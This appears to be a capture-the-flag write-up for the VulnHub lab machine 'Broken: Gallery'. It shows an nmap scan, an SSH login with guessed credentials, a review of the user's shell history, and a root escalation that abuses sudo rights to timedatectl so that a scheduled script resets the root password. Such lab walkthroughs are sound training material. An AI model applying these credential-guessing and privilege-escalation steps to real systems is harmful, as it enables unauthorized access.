Broken :  Gallery

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] Password Guessing
[+] Privilege Escalation Abusing SUDO rights /timedatectl and reboot.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-14 01:05 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done

root@setrus:~/vulnhub/broken# nmap -sTV -O -A 192.168.56.104 | tee OVAT_broken
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-14 01:05 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
|_  256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
MAC Address: 08:00:27:99:DD:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Trying broken : broken as ssh credentials and we are logged into the server. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh broken@192.168.56.104
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ECDSA key fingerprint is SHA256:6iK6MbJOGAwgxFmxooFsdDj4+MUBHpeR4l54CPQQGhQ.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
broken@192.168.56.104's password: 
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

762 packages can be updated.
458 updates are security updates.

Last login: Fri Aug  9 02:40:48 2019 from 10.11.1.221
broken@ubuntu:~$ id
uid=1000(broken) gid=1000(broken) groups=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing the history of the user broken we found : 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
166  sudo sh -c 'echo broken:broken | chpasswd'
  167  ls
  168  sudo -l
  169  sudo vi /etc/sudoers
  170  cd /var/www/html/
  171  ls
  172  cd ..
  173  ls
  174  su - root
  175  which date
  176  which timedatectl
  177  sudo systemctl disable light.gdm
  178  su - root
  179  sudo -l
  180  timedatectl set-time '2019-08-08 13:45'
  181  date
  182  cd /etc/init.d/
  183  cat password-policy.sh 
  184  ./password-policy.sh 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
broken@ubuntu:~$ cat /etc/init.d/password-policy.sh 
#!/bin/bash

DAYOFWEEK=$(date +"%u")
echo DAYOFWEEK: $DAYOFWEEK

if [ "$DAYOFWEEK" -eq 4 ]
then
	sudo sh -c 'echo root:TodayIsAgoodDay | chpasswd'
fi



#if [ "$DAYOFWEEK" == 4 ] 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Changing the time with the example from https://www.tecmint.com/set-time-timezone-and-synchronize-time-using-timedatectl-command/
After reboot the password for root should be changed.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh broken@192.168.56.104
broken@192.168.56.104's password: 
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

762 packages can be updated.
458 updates are security updates.

Last login: Sun Oct 13 22:11:10 2019
broken@ubuntu:~$

broken@ubuntu:~$ su root
Password: 
root@ubuntu:/home/broken# 
root@ubuntu:/home/broken# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/broken# 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


